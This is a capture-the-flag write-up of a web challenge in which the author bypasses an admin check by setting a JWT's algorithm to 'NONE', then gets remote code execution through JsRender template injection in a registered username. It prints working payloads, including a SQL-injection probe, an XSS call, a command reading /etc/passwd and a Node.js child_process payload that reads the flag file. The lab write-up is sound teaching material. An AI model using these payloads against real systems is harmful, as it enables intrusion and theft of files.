# Didactic Octo Paddles

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319151146.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319151158.png)

In here, we see there's a login page.

Whenever I deal with a login page, I always try SQL injection to bypass the authentication, like simple `' OR 1=1-- -`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319151404.png)

Nope.

**Let's read the [source code](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Web/Didactic-Octo-Paddles/web_didactic_octo_paddle.zip)**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Didactic-Octo-Paddles)-[2023.03.19|15:14:19(HKT)]
└> file web_didactic_octo_paddle.zip 
web_didactic_octo_paddle.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Didactic-Octo-Paddles)-[2023.03.19|15:14:20(HKT)]
└> unzip web_didactic_octo_paddle.zip      
Archive:  web_didactic_octo_paddle.zip
   creating: web_didactic_octo_paddle/
   creating: web_didactic_octo_paddle/config/
  inflating: web_didactic_octo_paddle/config/supervisord.conf  
  inflating: web_didactic_octo_paddle/Dockerfile  
 extracting: web_didactic_octo_paddle/flag.txt  
  inflating: web_didactic_octo_paddle/build_docker.sh  
   creating: web_didactic_octo_paddle/challenge/
   creating: web_didactic_octo_paddle/challenge/middleware/
  inflating: web_didactic_octo_paddle/challenge/middleware/AuthMiddleware.js  
  inflating: web_didactic_octo_paddle/challenge/middleware/AdminMiddleware.js  
  inflating: web_didactic_octo_paddle/challenge/index.js  
   creating: web_didactic_octo_paddle/challenge/utils/
  inflating: web_didactic_octo_paddle/challenge/utils/database.js  
  inflating: web_didactic_octo_paddle/challenge/utils/authorization.js  
  inflating: web_didactic_octo_paddle/challenge/package.json  
   creating: web_didactic_octo_paddle/challenge/static/
   creating: web_didactic_octo_paddle/challenge/static/css/
  inflating: web_didactic_octo_paddle/challenge/static/css/main.css  
   creating: web_didactic_octo_paddle/challenge/static/images/
  inflating: web_didactic_octo_paddle/challenge/static/images/Parasite Punisher.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/Octo Alien Annihilator.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/Didactic Alien Destroyer.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/River Rescuer.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/favicon.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/Relic Retriever Joker.png  
  inflating: web_didactic_octo_paddle/challenge/static/images/Hack and Slash.png  
   creating: web_didactic_octo_paddle/challenge/static/js/
  inflating: web_didactic_octo_paddle/challenge/static/js/register.js  
  inflating: web_didactic_octo_paddle/challenge/static/js/main.js  
  inflating: web_didactic_octo_paddle/challenge/static/js/login.js  
   creating: web_didactic_octo_paddle/challenge/views/
  inflating: web_didactic_octo_paddle/challenge/views/login.jsrender  
  inflating: web_didactic_octo_paddle/challenge/views/index.jsrender  
  inflating: web_didactic_octo_paddle/challenge/views/cart.jsrender  
  inflating: web_didactic_octo_paddle/challenge/views/register.jsrender  
  inflating: web_didactic_octo_paddle/challenge/views/admin.jsrender  
   creating: web_didactic_octo_paddle/challenge/routes/
  inflating: web_didactic_octo_paddle/challenge/routes/index.js
```

**After poking around at the source code, we can register an account:** (`/routes/index.js`)
```js
router.get("/register", async (req, res) => {
    res.render("register");
});

router.post("/register", async (req, res) => {
    try {
        const username = req.body.username;
        const password = req.body.password;

        if (!username || !password) {
            return res
                .status(400)
                .send(response("Username and password are required"));
        }

        const existingUser = await db.Users.findOne({
            where: { username: username },
        });
        if (existingUser) {
            return res
                .status(400)
                .send(response("Username already exists"));
        }

        await db.Users.create({
            username: username,
            password: bcrypt.hashSync(password),
        }).then(() => {
            res.send(response("User registered succesfully"));
        });
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});
```

If we send a GET request to `/register`, it renders the register page.

If we send a POST request with `username` and `password` data, it'll create a new account.

**Also, there's a `/admin` route:**
```js
router.get("/admin", AdminMiddleware, async (req, res) => {
    try {
        const users = await db.Users.findAll();
        const usernames = users.map((user) => user.username);

        res.render("admin", {
            users: jsrender.templates(`${usernames}`).render(),
        });
    } catch (error) {
        console.error(error);
        res.status(500).send("Something went wrong!");
    }
});
```

This route will render admin page. However, it's using `AdminMiddleware` to check the user is authenticated and is admin.

**`/middleware/AdminMiddleware.js`:**
```js
const jwt = require("jsonwebtoken");
const { tokenKey } = require("../utils/authorization");
const db = require("../utils/database");

const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};

module.exports = AdminMiddleware;
```

In here, we see that it's using JWT (JSON Web Token) to check the user is admin or not.

- If no session cookie, redirect to `/login` (Not logged in)
- Then, ***`jwt.decode()`*** our session cookie
- If the algorithm is `none`:
    - Redirect to `/login`
- If the algorithm is `HS256` (HMAC + SHA256):
    - `jwt.verify()` our session cookie with the `tokenKey`, which is cryptographically random 32 bytes
    - Then, find `username` is `admin` from the JWT's data: `id`
- If the algorithm is NOT `none` and `HS256`:
    - `jwt.verify()` our session cookie **without `tokenKey`**
    - Then, find `username` is `admin` from the JWT's data: `id`

Hmm... That's weird... **Maybe we can abuse JWT's algorithm other than `none` and `HS256` to achieve privilege escalation??**

**Now, we can go to `/register`, and create a new account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319154408.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319154414.png)

**`/login` route:**
```js
router.get("/login", async (req, res) => {
    res.render("login");
});

router.post("/login", async (req, res) => {
    try {
        const username = req.body.username;
        const password = req.body.password;

        if (!username || !password) {
            return res
                .status(400)
                .send(response("Username and password are required"));
        }

        const user = await db.Users.findOne({
            where: { username: username },
        });
        if (!user) {
            return res
                .status(400)
                .send(response("Invalid username or password"));
        }

        const validPassword = bcrypt.compareSync(password, user.password);
        if (!validPassword) {
            return res
                .status(400)
                .send(response("Invalid username or password"));
        }

        const token = jwt.sign({ id: user.id }, tokenKey, {
            expiresIn: "1h",
        });

        res.cookie("session", token);

        return res.status(200).send(response("Logged in successfully"));
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});
```

When we send a GET request to `/login`, it renders the login page.

When we send a POST request with `username` and `password` data, it'll check the username and password is correct or not.

If all correct, use `jwt.sign()` with the `tokenKey` to sign a new JWT, which binds to our user session.

**Seems like nothing weird. Let's login:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319154847.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319154852.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319155031.png)

> Note: It's highlighted in green because of the "JSON Web Tokens" extension.

**`/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319154900.png)

**Now, let's go to [jwt.io](https://jwt.io/) to decode our JWT session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319155134.png)

In the header, using `HS256` algorithm.

**Payload:**
```json
{
  "id": 2,
  "iat": 1679212128,
  "exp": 1679215728
}
```

The `id` could be vulnerable to IDOR (Insecure Direct Object Reference), however, it's verified by the `tokenKey`, so we couldn't easily tamper with it.

**To view the admin page, we can go to `/admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319155711.png)

As excepted, the JWT's `id`'s value is not the `admin` one.

**Let's change the JWT algorithm to `NONE`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319160614.png)

As you can see, I was able to bypass it and view the `/admin` page. However, nothing weird other than viewing other users' username

So, what's our goal in this challenge?

I don't see any flag in database, so no SQL injection?

Hmm... Maybe we can **exploit SSTI (Server-Side Template Injection) in `/admin` by registering a SSTI payload??**

But first, what is the template engine is the web application using?

**In `/routes/index.js`, we see a JavaScript template engine called JsRender:** 
```js
router.get("/admin", AdminMiddleware, async (req, res) => {
    try {
        const users = await db.Users.findAll();
        const usernames = users.map((user) => user.username);

        res.render("admin", {
            users: jsrender.templates(`${usernames}`).render(),
        });
    } catch (error) {
        console.error(error);
        res.status(500).send("Something went wrong!");
    }
});
```

As you can see, it's parsing all the usernames to the `admin` template, and render it.

**In `/views/admin.jsrender`, we can see this:**
```html
[...]
<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
    </ul>
  </div>
</body>
[...]
```

Hmm... Usernames are directly concatenated, ***no validation/sanitization*** at all!!

That being said, if we register an account that contains a **SSTI RCE (Remote Code Execution) payload**, we can read the flag!!

By Googling "JsRender SSTI", I found [this research from AppCheck](https://appcheck-ng.com/template-injection-jsrender-jsviews):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320141505.png)

In that blog, it has a JsRender SSTI RCE payload.

> **_“JsRender_** _is a light-weight but powerful templating engine, highly extensible, and optimized for high-performance rendering, without DOM dependency. It is designed for use in the browser or on Node.js, with or without jQuery._
>   
> [_JsRender_](https://github.com/BorisMoore/jsrender) _and_ [_JsViews_](https://github.com/BorisMoore/jsviews) _together provide the next-generation implementation of the official jQuery plugins_ [_JQuery Templates_](https://github.com/BorisMoore/jquery-tmpl)_, and_ [_JQuery Data Link_](https://github.com/BorisMoore/jquery-datalink) _— and supersede those libraries.“_

> Templating engines such as JsRender allow the developer to create a static template to render a HTML page and embed dynamic data using Template Expressions. Typically, templating engines use a variation of the curly braces closure syntax to embed dynamic data, in JsRender the “evaluate” tag can be used to render the result of a JavaScript expression.
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320141757.png)

> Due to the reflective nature of JavaScript, it is possible to **break out of this restricted context**. One method to achieve this is to access the special **`“constructor”`** property of a built-in JavaScript function, this gives us access to the function used to create the function (or object) we are referencing it from. For example, several JavaScript objects including strings have a default function named **`toString()`** which we can reference within the injected expression, e.g. **`{{:"test".toString()}}`**

> From here we can access the function **`constructor`** which allows us to build a new function by calling it. In this example we create an anonymous function designed to display a JavaScript alert box.

```js
{{:%22test%22.toString.constructor.call({},"alert('xss')")}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142129.png)

> Finally, we can call this newly created function by adding parentheses to complete the attack:

```js
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142208.png)

> Since we are within the Node.js environment we can gain remote code execution by executing the following payload (executing **`cat /etc/passwd`** in this example).

```js
require('child_process').execSync('cat /etc/passwd')
```

There is however one move obstacle to overcome, the “require” function is not directly available in our newly created function. However, we are able to use reflection to access the same functionality via **`global.process.mainModule.constructor._load()`**

**Armed with above information, we can register the following account in the username field to get the flag:**
```js
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142354.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142405.png)

**Then login our previously created account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142449.png)

**Finally, using the JWT with header's `alg` set to `NONE`, and payload's `id` set to `1` to bypass the `/admin` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230320142733.png)

```html
<li class="list-group-item d-flex justify-content-between align-items-center ">
    <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
    </span>
</li>
```

Boom! We finally got the flag!!

- **Flag: `HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`**

## Conclusion

What we've learned:

1. JWT Header's `"alg": "NONE"` Authentication Bypass & RCE Via JsRender SSTI